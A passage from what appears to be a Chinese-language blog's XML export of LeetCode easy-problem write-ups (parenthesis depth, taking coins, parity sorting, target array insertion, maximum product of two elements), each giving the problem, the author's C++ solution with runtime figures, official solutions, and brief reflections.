<li><code>1 &lt;= s.length &lt;= 100</code></li>
<li><code>s</code> 由数字 <code>0-9</code> 和字符 <code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;*&#39;</code>、<code>&#39;/&#39;</code>、<code>&#39;(&#39;、&#39;)&#39;</code> 组成</li>
<li>题目数据保证括号表达式 <code>s</code> 是 <strong>有效的括号表达式</strong></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串s的字符，如果是’(‘则深度加1，如果是’)’则保存当前最大深度，然后深度减1。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败53.54%，内存消耗6.4M，击败12.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                ++tmp;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp&gt;result)&#123;</span><br><span class="line">                    result=tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                --tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，本来想是不是要用到栈stack，后来一想好像不需要就可以完成。😶</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>拿硬币</title>
    <url>/2020/11/09/%E6%8B%BF%E7%A1%AC%E5%B8%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/na-ying-bi/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>桌上有 <code>n</code> 堆力扣币，每堆的数量保存在数组 <code>coins</code> 中。我们每次可以选择任意一堆，拿走其中的一枚或者两枚，求拿完所有力扣币的最少次数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[4,2,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：第一堆力扣币最少需要拿 2 次，第二堆最少需要拿 1 次，第三堆最少需要拿 1 次，总共 4 次即可拿完。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,3,10]</span><br><span class="line">输出：8</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 4</code></li>
<li><code>1 &lt;= coins[i] &lt;= 10</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历n堆力扣币coins，对每一堆判断是否大于0，有则次数加1，币数减2循环计算。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗8.4M，击败9.29%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCount</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;coins.size();++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(coins[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">                coins[i]-=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/na-ying-bi/solution/na-ying-bi-by-leetcode-solution/">官方题解</a>:</h6><p><strong>题意概述</strong><br>有 n 堆硬币，每次从任意一堆拿走一枚或者两枚。问最少几次能够全部拿完。</p>
<p><strong>题解</strong><br>题目中虽然给了 n 堆硬币，但是最终每一堆都是要拿完的。而每一堆拿的情况又不影响其他硬币堆，<strong>因此每一堆硬币的拿法实际上是互相独立的</strong>。</p>
<p>于是我们可以只考虑一堆的情况。假设一堆有 x 枚硬币，既然我们的目的是尽早拿完所有硬币堆，那么两枚两枚的拿显然是更快的。</p>
<p>求单堆硬币最小次数：<code>(x+1)//2</code></p>
<p>那么，拿完所有硬币堆只需要循环对所有硬币堆都计算一次，然后求和就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minCount</span>(<span class="params">self, coins: List[int]</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> sum([(x+<span class="number">1</span>)//<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> coins])</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是python解法，用官方的思路c++实现跟我的代码效率也差不多!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>按奇偶排序数组II</title>
    <url>/2020/11/24/%E6%8C%89%E5%A5%87%E5%81%B6%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84II/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sort-array-by-parity-ii/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个非负整数数组 <code>A</code>， <code>A</code> 中一半整数是奇数，一半整数是偶数。</p>
<p>对数组进行排序，以便当 <code>A[i]</code> 为奇数时，<code>i</code> 也是奇数；当 <code>A[i]</code> 为偶数时， <code>i</code> 也是偶数。</p>
<p>你可以返回任何满足上述条件的数组作为答案。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[4,2,5,7]</span><br><span class="line">输出：[4,5,2,7]</span><br><span class="line">解释：[4,7,2,5]，[2,5,4,7]，[2,7,4,5] 也会被接受。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>2 &lt;= A.length &lt;= 20000</code></li>
<li><code>A.length % 2 == 0</code></li>
<li><code>0 &lt;= A[i] &lt;= 1000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>再定义一个vector数组result存储排序后的序列，遍历数组A，根据元素的奇偶性存储到result相应的索引位置上，然后索引值加2指向下一个奇/偶位置。</p>
<p><strong>c++代码：</strong>(执行用时48ms，击败50.89%，内存消耗20.5M，击败46.55%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParityII</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=A.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> even=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> odd=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                result[even]=A[i];</span><br><span class="line">                even+=<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result[odd]=A[i];</span><br><span class="line">                odd+=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/sort-array-by-parity-ii/solution/an-qi-ou-pai-xu-shu-zu-ii-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一： 两次遍历</strong></p>
<p><strong>思路和算法</strong></p>
<p>遍历一遍数组把所有的偶数放进 <code>ans[0]</code>，<code>ans[2]</code>，<code>ans[4]</code>，依次类推。</p>
<p>再遍历一遍数组把所有的奇数依次放进 <code>ans[1]</code>，<code>ans[3]</code>，<code>ans[5]</code>，依次类推。</p>
<p><strong>c++代码：</strong>(执行用时60ms，击败15.13%，内存消耗20.5M，击败40.97%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParityII</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: A) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                ans[i] = x;</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: A) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                ans[i] = x;</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 N是数组 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。注意在这里我们不考虑输出数组的空间占用。</li>
</ul>
<p><strong>方法二： 双指针</strong></p>
<p><strong>思路与算法</strong></p>
<p>如果原数组可以修改，则可以使用就地算法求解。</p>
<p>为数组的偶数下标部分和奇数下标部分分别维护指针 $i, j$。随后，在每一步中，如果 $A[i]$为奇数，则不断地向前移动 $j$（每次移动两个单位），直到遇见下一个偶数。此时，可以直接将 $A[i]$ 与 $A[j]$交换。我们不断进行这样的过程，最终能够将所有的整数放在正确的位置上。</p>
<p><strong>c++代码：</strong>(执行用时44ms，击败72.18%，内存消耗20.4M，击败72.28%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParityII</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    j += <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                swap(A[i], A[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 N是数组 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解第一个方法其实两次遍历可以优化成我这样一次遍历，第二种方法双指针也比较好，理解起来也不难，两种方法效率都差不多，可能双指针在原数组上进行修改空间上会好一些。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>按既定顺序创建目标数组</title>
    <url>/2020/11/09/%E6%8C%89%E6%97%A2%E5%AE%9A%E9%A1%BA%E5%BA%8F%E5%88%9B%E5%BB%BA%E7%9B%AE%E6%A0%87%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数数组 <code>nums</code> 和 <code>index</code>。你需要按照以下规则创建目标数组：</p>
<p>目标数组 <code>target</code> 最初为空。<br>按从左到右的顺序依次读取 <code>nums[i]</code> 和 <code>index[i]</code>，在 <code>target</code> 数组中的下标 <code>index[i]</code> 处插入值 <code>nums[i]</code> 。<br>重复上一步，直到在 <code>nums</code> 和 <code>index</code> 中都没有要读取的元素。<br>请你返回目标数组。</p>
<p>题目保证数字插入位置总是存在。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [0,1,2,3,4], index &#x3D; [0,1,2,2,1]</span><br><span class="line">输出：[0,4,1,3,2]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">0            0        [0]</span><br><span class="line">1            1        [0,1]</span><br><span class="line">2            2        [0,1,2]</span><br><span class="line">3            2        [0,1,3,2]</span><br><span class="line">4            1        [0,4,1,3,2]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4,0], index &#x3D; [0,1,2,3,0]</span><br><span class="line">输出：[0,1,2,3,4]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">1            0        [1]</span><br><span class="line">2            1        [1,2]</span><br><span class="line">3            2        [1,2,3]</span><br><span class="line">4            3        [1,2,3,4]</span><br><span class="line">0            0        [0,1,2,3,4]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1], index &#x3D; [0]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length, index.length &lt;= 100</code></li>
<li><code>nums.length == index.length</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
<li><code>0 &lt;= index[i] &lt;= i</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历，将每一个nums中的元素插入到目标数组中，相应的位置为index中元素的值。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败69.65%，内存消耗8.5M，击败29.71%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">createTargetArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; index)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            result.insert(result.begin()+index[i],nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/solution/an-ji-ding-shun-xu-chuang-jian-mu-biao-shu-zu-by-l/">官方题解</a>:</h6><p><strong>方法一：模拟</strong><br><strong>思路</strong></p>
<p>使用顺序表作为答案的存储结构，按照题意模拟即可。具体的方法是：要在当前的下标从 $0$ 开始长度为 $n$ 的顺序表的 $i$ 位置插入元素，就要先把原来表中区间$[i, n]$中的元素从全部向后移动一位，然后在 $i$ 位置插入带插入的元素。当然很多语言中都有现成的方法可以调用，比如 C++ <code>vector</code> 类中的 <code>insert</code>、Python 列表中的 <code>insert</code> 等。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗8.7M，击败5.43%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">createTargetArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; index)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i) &#123;</span><br><span class="line">            r.insert(r.begin() + index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>记数组的长度为 $n$。</p>
<ul>
<li>时间复杂度：考虑一次操作最坏情况下的时间代价和当前数组中元素的个数呈正比， 第 $i$ 次操作时元素个数为 $i - 1$，所以这里渐进时间复杂度为 $O(\sum_{i = 1}^{n} (i - 1)) = O(n^2)$</li>
<li>空间复杂度：这里没有使用到辅助空间，故渐进空间复杂度为 $O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>解题过程和官方题解一致，代码也几乎相同，应该是最优解了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组中两元素的最大乘积</title>
    <url>/2020/11/13/%E6%95%B0%E7%BB%84%E4%B8%AD%E4%B8%A4%E5%85%83%E7%B4%A0%E7%9A%84%E6%9C%80%E5%A4%A7%E4%B9%98%E7%A7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-product-of-two-elements-in-an-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code>，请你选择数组的两个不同下标 <code>i</code> 和 <code>j</code>，使 <code>(nums[i]-1)*(nums[j]-1)</code> 取得最大值。</p>
<p>请你计算并返回该式的最大值。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,4,5,2]</span><br><span class="line">输出：12 </span><br><span class="line">解释：如果选择下标 i&#x3D;1 和 j&#x3D;2（下标从 0 开始），则可以获得最大值，(nums[1]-1)*(nums[2]-1) &#x3D; (4-1)*(5-1) &#x3D; 3*4 &#x3D; 12 。 </span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,5,4,5]</span><br><span class="line">输出：16</span><br><span class="line">解释：选择下标 i&#x3D;1 和 j&#x3D;3（下标从 0 开始），则可以获得最大值 (5-1)*(5-1) &#x3D; 16 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,7]</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^3</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>调用&lt; algorithm&gt;头文件中的sort方法进行排序(默认升序)，然后用最后两个元素计算最大值返回。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败46.21%，内存消耗10.1M，击败32.85%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//调用sort排序（从小到大）</span></span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">return</span> (nums[nums.size()<span class="number">-1</span>]<span class="number">-1</span>)*(nums[nums.size()<span class="number">-2</span>]<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解(😍)，简单题刷过了就可以了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组异或操作</title>
    <url>/2020/11/07/%E6%95%B0%E7%BB%84%E5%BC%82%E6%88%96%E6%93%8D%E4%BD%9C/</url>
